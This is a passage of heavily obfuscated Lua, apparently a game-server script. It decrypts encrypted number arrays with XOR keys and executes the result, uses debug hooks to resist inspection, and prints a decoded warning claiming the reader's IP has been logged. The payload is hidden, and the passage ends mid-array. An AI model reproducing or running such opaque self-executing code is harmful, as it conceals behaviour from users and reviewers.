            function(t) if #xwqgXjFbTRMZNi21zm7FPJ1jJbDosDLMh5rthVl84HeXBjqxai2V(hFqWKEivAq0aOyOVpzzuVr9GpxGrVufXPTzBiQyM3mM9UtSjA2HFqzOc4pUsfSXExe[oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('2E') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('4F') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('B5') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('D6')]) == 1 then if hFqWKEivAq0aOyOVpzzuVr9GpxGrVufXPTzBiQyM3mM9UtSjA2HFqzOc4pUsfSXExe[oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('2E') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('4F') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('B5') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('D6')] == hFqWKEivAq0aOyOVpzzuVr9GpxGrVufXPTzBiQyM3mM9UtSjA2HFqzOc4pUsfSXExe[oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('5A') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('70') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('0D') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('44') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('86')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if hFqWKEivAq0aOyOVpzzuVr9GpxGrVufXPTzBiQyM3mM9UtSjA2HFqzOc4pUsfSXExe[oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('2E') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('4F') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('B5') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('D6')](t) then
                    hFqWKEivAq0aOyOVpzzuVr9GpxGrVufXPTzBiQyM3mM9UtSjA2HFqzOc4pUsfSXExe
                        [oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('2E') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('4F') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('B5') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('D6')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; afl671TwfHbqiaIg0T5qCrNhD5Idvti62UAKKq6PxigrrQgyWcxGazjrD(
{ 955, 617, 884, 1003, 885, 638, 587, 576, 1149, 819, 1054, 1129, 984, 562, 742, 927, 920, 565, 1063, 555, 770, 915, 658,
  875, 926, 624, 739, 689, 1212, 961, 1192, 861, 864, 572, 726, 634, 834, 935, 1191, 942, 1043, 1203, 1040, 1099, 755,
  957, 976, 752, 862, 1196, 551, 1070, 552, 662, 827, 1067, 798, 1017, 872, 724, 595, 977, 1178, 1137, 1073, 851, 1092,
  558, 959, 789, 637, 672, 786, 1009, 614, 911, 582, 1024, 1042, 1076, 776, 1036, 1148, 561, 919, 810, 1007, 1181, 985,
  969, 973, 1177, 697, 1061, 793, 645, 773, 560, 1170, 863, 586, 847, 881, 1210, 758, 716, 889, 568, 682, 1199, 1164,
  725, 1098, 648, 1093, 986, 741, 1019, 665, 1109, 1179, 790, 1182, 730, 777, 806, 778, 1198, 720, 1034, 820, 767, 1200,
  1044, 564, 823, 743, 1062, 813, 794, 954, 1204, 843, 754, 949, 633, 788, 877, 991, 626, 711, 1159, 850, 735, 708, 1132,
  867, 621, 1184, 1118, 859, 703, 1138, 683, 796, 804, 744, 706, 727, 1081, 785, 764, 676, 670, 578, 865, 797, 602, 940,
  705, 856, 848, 866, 693, 792, 1079, 1152, 660, 647, 887, 999, 579, 960, 1096, 545, 918, 892, 694, 895, 566, 643, 1180,
  968, 939, 830, 854, 1133, 563, 1119, 795, 569, 1120, 845, 893, 751, 1143, 655, 619, 1031, 1157, 784, 1016, 671, 938,
  1195, 717, 1189, 1155, 606, 890, 1175, 849, 605, 1066, 737, 1083, 1188, 971, 584, 1089, 544, 661, 1134, 573, 1032, 860,
  1174, 1046, 1047, 781, 835, 577, 987, 701, 674, 1106, 899, 1060, 936, 989, 1104, 684, 559, 611, 1045, 622, 1151, 753,
  829, 675, 809, 1103, 1211, 596, 868, 871, 979, 618, 1162, 1014, 799, 613, 718, 833, 771, 1163, 782, 765, 656, 869, 937,
  1131, 983, 574, 678, 1064, 855, 970, 836, 1075, 902, 709, 692, 894, 1077, 594, 811, 554, 807, 951, 712, 673, 581, 677,
  922, 975, 944, 800, 1002, 1085, 1205, 750, 1029, 841, 1111, 575, 769, 588, 822, 853, 1144, 1150, 1086, 1094, 858, 925,
  1008, 818, 933, 1115, 628, 832, 1190, 913, 1185, 803, 641, 721, 908, 748, 630, 746, 953, 1091, 715, 870, 651, 1146,
  1011, 615, 907, 921, 1130, 1124, 965, 909, 1050, 1001, 556, 1068, 873, 657, 654, 1039, 550, 549, 824, 1026, 1101, 612,
  844, 988, 780, 998, 923, 945, 722, 826, 1057, 904, 589, 598, 990, 992, 772, 583, 816, 1206, 635, 1207, 1125, 812, 609,
  1156, 1020, 857, 632, 1000, 1010, 1072, 883, 1114, 802, 1107, 1105, 808, 696, 879, 639, 779, 1095, 1065, 1208, 1023,
  958, 629, 593, 663, 839, 625, 978, 815, 897, 704, 1141, 1136, 774, 924, 713, 591, 1038, 1041, 763, 964, 1117, 966,
  1116, 761, 738, 1097, 652, 1193, 640, 1102, 1088, 729, 1100, 1147, 620, 686, 762, 1165, 910, 585, 740, 685, 680, 1122,
  1201, 557, 607, 846, 732, 943, 882, 828, 642, 1187, 801, 831, 1108, 631, 669, 1176, 1004, 1139, 929, 699, 1006, 995,
  1128, 886, 1169, 1209, 1051, 1033, 1069, 1035, 710, 934, 1145, 1013, 891, 912, 688, 707, 723, 950, 1113, 570, 664,
  1087, 1158, 1123, 667, 974, 1055, 747, 1030, 775, 888, 603, 592, 1058, 930, 1127, 668, 787, 1140, 766, 597, 791, 1056,
  749, 1012, 1028, 610, 653, 690, 1080, 821, 838, -1, 51, 44, 80, 99, 205, 60, 82, 67, 68, 67, 62, 44, 83, 75, 31, 61,
  59, 73, 33, 40, 67, 75, 49, 101, 18, 15, 121, 33, 151, 77, 31, 65, 63, 12, 109, 21, 16, 242, 79, 68, 39, 14, 120, 43,
  43, 103, 23, 22, 9, 117, 67, 7, 47, 63, 38, 66, 249, 34, 37, 113, 22, 223, 9, 2, 124, 128, 88, 93, 14, 110, 37, 118,
  98, 33, 102, 46, 30, 31, 3, 45, 240, 4, 109, 21, 106, 33, 23, 66, 109, 14, 39, 84, 50, 195, 93, 33, 117, 0, 46, 102, 3,
  98, 110, 76, 106, 23, 201, 228, 18, 33, 107, 102, 59, 106, 107, 36, 206, 105, 4, 67, 82, 27, 26, 180, 31, 117, 74, 112,
  74, 10, 2, 28, 68, 67, 22, 104, 209, 16, 174, 75, 70, 95, 20, 54, 53, 67, 89, 56, 124, 20, 4, 105, 66, 12, 87, 44, 100,
  170, 7, 221, 123, 39, 92, 70, 82, 72, 59, 15, 87, 22, 62, 209, 90, 81, 98, 52, 152, 0, 82, 35, 66, 10, 4, 102, 69, 219,
  63, 73, 53, 75, 100, 35, 74, 187, 23, 48, 10, 51, 16, 27, 117, 80, 248, 109, 68, 120, 97, 82, 107, 46, 12, 61, 80, 47,
  230, 67, 173, 83, 60, 70, 77, 127, 70, 112, 80, 241, 25, 80, 74, 75, 18, 80, 80, 47, 89, 52, 73, 18, 116, 11, 30, 13,
  77, 21, 65, 8, 33, 127, 38, 108, 93, 23, 17, 106, 87, 25, 95, 58, 67, 115, 21, 16, 166, 72, 121, 20, 6, 19, 31, 6, 48,
  175, 33, 55, 133, 25, 67, 105, 30, 112, 37, 66, 60, 77, 117, 65, 105, 125, 82, 12, 25, 1, 85, 78, 45, 38, 66, 50, 22,
  81, 66, 90, 88, 99, 77, 92, 31, 101, 37, 203, 98, 74, 67, 67, 47, 113, 76, 26, 60, 62, 46, 53, 66, 68, 81, 15, 0, 98,
  40, 58, 126, 111, 3, 232, 49, 208, 60, 11, 10, 121, 82, 48, 13, 77, 89, 67, 60, 36, 102, 82, 127, 33, 86, 105, 30, 183,
  34, 234, 163, 12, 13, 21, 220, 57, 113, 13, 83, 2, 65, 23, 58, 76, 36, 81, 69, 126, 121, 31, 77, 33, 22, 33, 77, 7, 59,
  147, 86, 5, 101, 38, 5, 68, 91, 7, 15, 110, 101, 105, 213, 109, 110, 19, 45, 117, 217, 230, 11, 109, 8, 97, 74, 10,
  105, 202, 70, 102, 90, 79, 65, 199, 241, 24, 7, 26, 126, 66, 30, 4, 59, 26, 14, 38, 12, 87, 89, 9, 19, 3, 183, 136,
  123, 48, 6, 17, 84, 98, 5, 48, 26, 27, 8, 141, 98, 12, 232, 78, 115, 33, 84, 117, 27, 31, 251, 80, 35, 68, 125, 90, 80,
  74, 65, 29, 252, 71, 47, 237, 36, 7, 140, 68, 65, 87, 232, 109, 241, 105, 2, 110, 67, 65, 22, 122, 7, 73, 53, 1, 23,
  90, 80, 19, 74, 27, 69, 57, 26, 16, 46, 117, 67, 205, 210, 23, 52, 69, 8, 12, 121, 8, 102, 65, 18, 25, 110, 56, 10,
  105, 48, 9, 82, 70, 22, 250, 109, 90, 70, 174, 78, 11, 97, 251, 66, 94, 65, 80, 38, 3, 63, 40, 110, 3, 16, 98, 75, 85,
  15, 35, 33, 66, 74, 26, 17, 17, 68, 39, 68, 66, 58, 228, 7, 171, 6, 108, 22, 31, 117, 69, 91, 78, 42, 21, 13, 31, 27,
  78, 42, 113, 2, 7, 115, 87, 86, 53, 86, 83, 82, 111, 44, 97, 18, 222, 70, 18, 121, 78, 34, 5, 14, 78, 54, 71, 202, 36,
  11, 42, 22, 26, 115, 30, 92, 87, 0, 43, 11, 147, 16, 197, 68, 0, 44, 89, 93, 22, 62, 110, 109, 4, 90, 86, 68, 26, 166,
  114, 121, 136, 23, 37, 98, 19, 104, 30, 25, 99, 90, 1, 14, 3, 40, 58, 75, 101, 110, 28, 46, 65, 82, 121, 80, 31, 23, 59 },
  "c6UikNYaF7crbMjNzB2npBQmdp"); xrwCLTG1oJRbJ56Eg1FjeTtXX7wx4gN7Z2mNajpIc47vQyTPANRBEPYrwE6Ge5BquKWVwFK =
hFqWKEivAq0aOyOVpzzuVr9GpxGrVufXPTzBiQyM3mM9UtSjA2HFqzOc4pUsfSXExe; so8Rf5GAnPZyZAOXtxcS0NIpfPbLsEMjm2zXb8Fwh36voZ5xqo1nxBlNwZza =
hFqWKEivAq0aOyOVpzzuVr9GpxGrVufXPTzBiQyM3mM9UtSjA2HFqzOc4pUsfSXExe; fiRbw7z1EeggLdtnEp5lUCEZzKXKmRQLik16sMWAgDT86CkDoqfSPOfSbaJTidfyLvXd =
so8Rf5GAnPZyZAOXtxcS0NIpfPbLsEMjm2zXb8Fwh36voZ5xqo1nxBlNwZza; pfLPruedbvVZ3Ix87zVnKbRYcZLiA69fHENBg5yFUyPv9qZenor04x5yyiMu7c1RF6g =
fiRbw7z1EeggLdtnEp5lUCEZzKXKmRQLik16sMWAgDT86CkDoqfSPOfSbaJTidfyLvXd; uP2LiSTDS1Lpk75hLtRFu2r3nUD53so4n2bKeetiViEvbH741OAEBi =
pfLPruedbvVZ3Ix87zVnKbRYcZLiA69fHENBg5yFUyPv9qZenor04x5yyiMu7c1RF6g; oVw4CxAZCOhfUnXHzRnza2hEmUzadXUk4QyGk6QcoX66vas9q7H =
uP2LiSTDS1Lpk75hLtRFu2r3nUD53so4n2bKeetiViEvbH741OAEBi; wMOONSO5OhmD8DpRu3HAQIGvsn606UjaWbPpuv5pjpwB0FlLK6kVgL3m3DZxHTLk =
oVw4CxAZCOhfUnXHzRnza2hEmUzadXUk4QyGk6QcoX66vas9q7H; mAxDsQOkI6G3ZtpBbxZRzDBQ9sFiGiZjU0k7SvWaYHiAZmAQ0cN =
wMOONSO5OhmD8DpRu3HAQIGvsn606UjaWbPpuv5pjpwB0FlLK6kVgL3m3DZxHTLk; bLji1ab4ne1D1YvPontXbMzzA6Il4Zevn3Kiq5K3ugWT1eekzxS0QF =
mAxDsQOkI6G3ZtpBbxZRzDBQ9sFiGiZjU0k7SvWaYHiAZmAQ0cN; jOmoh2QEtzbjFcOjg5cAyRNHGiK7n5IqMh0QSi1DYn67yradV8GyQW8 =
bLji1ab4ne1D1YvPontXbMzzA6Il4Zevn3Kiq5K3ugWT1eekzxS0QF; rTi65jgAzIzmIooFw4XURyjGslak6UEWoOB2BATbdqi8EGrdUGaIbA8hvEyrTvG =
jOmoh2QEtzbjFcOjg5cAyRNHGiK7n5IqMh0QSi1DYn67yradV8GyQW8; jZQeIq6xnrvPNOeY6G0JqRjAhoyXlMxc24MPmTj2pYuLiR3LXvEZr =
rTi65jgAzIzmIooFw4XURyjGslak6UEWoOB2BATbdqi8EGrdUGaIbA8hvEyrTvG; fffQcBWv5YxCLLOmU3f7vRyQplEWlxrLE8idmAQRjAD9OhnSl3IgAh9UWfRLcqU6kGz3M =
jZQeIq6xnrvPNOeY6G0JqRjAhoyXlMxc24MPmTj2pYuLiR3LXvEZr; c7sMyylbls9EKiioM0IqstYZuc7ArwZamrARALdS89uJ6Dj7UdmThFOGFQX1WE =
fffQcBWv5YxCLLOmU3f7vRyQplEWlxrLE8idmAQRjAD9OhnSl3IgAh9UWfRLcqU6kGz3M; wUy8aBvyukK46IqW5TstG2nxdJS6GBM7Nx4SRjOU5Cg6iw7wRg4Vch0UxGOgdaszj3KW =
c7sMyylbls9EKiioM0IqstYZuc7ArwZamrARALdS89uJ6Dj7UdmThFOGFQX1WE; kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R = function(
  a)
  K, F = 7342939122830026, 16384 + 3960; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; dvaSb6Qa48TFULgfiIcinmbHWKQeLY6FWwGRIG8l2WJq1AEknVE = function(b)
  co = coroutine.create(b)
  tTQVNI9v8zBSVjqeJo1BOwErSMCskIIs7akscJ0gTj04ZAvrEB2RjpqQgOkDOwgNaju = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(tTQVNI9v8zBSVjqeJo1BOwErSMCskIIs7akscJ0gTj04ZAvrEB2RjpqQgOkDOwgNaju, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return tTQVNI9v8zBSVjqeJo1BOwErSMCskIIs7akscJ0gTj04ZAvrEB2RjpqQgOkDOwgNaju
end; cbuoPUmiRQJBFBQHz98NN2IJ1bvFazb0aCfLxM53C9qHoKzZ2R7 = function(f, g)
  xfJtd6sb6eNkWr3ipwI07KtVF9XphPmvXz7jL2CXodUHpQcKFXAAcTYuEXmFoQX1LDx = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; rzcrZrX6uUdCvvAVvgiRGlYvQCeIXLk1IoA49N8rKtAv9B78oxhRsF3YvEfNzhrF = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; lg1y5KmyYHMibMjhiHBFZmxlpAPU6RBZzZfISajZiulZr8NnIMnPm0jVlc = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      xfJtd6sb6eNkWr3ipwI07KtVF9XphPmvXz7jL2CXodUHpQcKFXAAcTYuEXmFoQX1LDx(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; vD9qdNVemJUtJlIj0BhBm5PYDpjZaV0AKUdFyaqai8p3w08PEMP17BhrHVvQul6dSJ6Pv0l = function(p, n)
    uXgWHD7gGkXiRb5flhCvWJPM0SzZpIVGNXimGt8ZQyUInBzFXRTWny3hP = ""
    for k, q in pairs(p) do uXgWHD7gGkXiRb5flhCvWJPM0SzZpIVGNXimGt8ZQyUInBzFXRTWny3hP =
      uXgWHD7gGkXiRb5flhCvWJPM0SzZpIVGNXimGt8ZQyUInBzFXRTWny3hP ..
      wUy8aBvyukK46IqW5TstG2nxdJS6GBM7Nx4SRjOU5Cg6iw7wRg4Vch0UxGOgdaszj3KW
      [kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('71') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('EC') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('F6') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('A3') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('0A') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('AD')]
      [kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('C1') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('28') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('CB') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('F6')](
      q) end
    ; n(uXgWHD7gGkXiRb5flhCvWJPM0SzZpIVGNXimGt8ZQyUInBzFXRTWny3hP)
  end; rzcrZrX6uUdCvvAVvgiRGlYvQCeIXLk1IoA49N8rKtAv9B78oxhRsF3YvEfNzhrF(f,
    function(r) lg1y5KmyYHMibMjhiHBFZmxlpAPU6RBZzZfISajZiulZr8NnIMnPm0jVlc(r, g,
        function(s) vD9qdNVemJUtJlIj0BhBm5PYDpjZaV0AKUdFyaqai8p3w08PEMP17BhrHVvQul6dSJ6Pv0l(s,
            function(t) if #dvaSb6Qa48TFULgfiIcinmbHWKQeLY6FWwGRIG8l2WJq1AEknVE(wUy8aBvyukK46IqW5TstG2nxdJS6GBM7Nx4SRjOU5Cg6iw7wRg4Vch0UxGOgdaszj3KW[kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('14') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('85') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('CB') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('3C')]) == 1 then if wUy8aBvyukK46IqW5TstG2nxdJS6GBM7Nx4SRjOU5Cg6iw7wRg4Vch0UxGOgdaszj3KW[kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('14') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('85') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('CB') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('3C')] == wUy8aBvyukK46IqW5TstG2nxdJS6GBM7Nx4SRjOU5Cg6iw7wRg4Vch0UxGOgdaszj3KW[kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('00') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('F6') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('A3') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('0A') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('EC')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if wUy8aBvyukK46IqW5TstG2nxdJS6GBM7Nx4SRjOU5Cg6iw7wRg4Vch0UxGOgdaszj3KW[kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('14') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('85') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('CB') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('3C')](t) then
                    wUy8aBvyukK46IqW5TstG2nxdJS6GBM7Nx4SRjOU5Cg6iw7wRg4Vch0UxGOgdaszj3KW
                        [kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('14') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('85') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('CB') .. kFoFZYdqA4JIaetWnuqVA4p3nU5yaRdwqD4TLwMdXOGm8QBt7Utj90R('3C')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; cbuoPUmiRQJBFBQHz98NN2IJ1bvFazb0aCfLxM53C9qHoKzZ2R7(
{ 1006, 878, 875, 926, 692, 651, 1028, 687, 779, 1084, 745, 984, 657, 623, 1169, 993, 778, 773, 759, 829, 767, 556, 965,
  720, 840, 893, 994, 1011, 729, 830, 1037, 801, 675, 566, 1146, 1048, 813, 905, 655, 554, 1064, 649, 643, 1040, 725,
